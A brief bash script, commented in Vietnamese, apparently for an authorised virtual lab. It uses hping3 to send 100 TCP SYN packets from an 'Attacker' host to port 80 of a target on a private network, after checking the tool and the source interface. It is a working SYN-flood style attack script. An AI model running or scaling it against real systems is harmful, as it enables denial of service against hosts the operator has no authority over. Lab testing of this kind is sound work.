#!/usr/bin/env bash
# Chay tren Attacker 192.168.100.10, mang VMnet1, trong lab duoc phep.
set -euo pipefail
TARGET="192.168.100.20"
SRC="192.168.100.10"
PORT=80
COUNT=100
if ! command -v hping3 >/dev/null 2>&1; then echo "Thieu hping3" >&2; exit 1; fi
if ! ip -4 addr show dev ens37 | grep -q "$SRC/24"; then echo "Chua co $SRC tren ens37" >&2; exit 1; fi
# -I ens37 khoa giao dien: khong gui ra NAT.
sudo hping3 -I ens37 -S -c "$COUNT" -i u10000 -p "$PORT" -s 40000 "$TARGET"
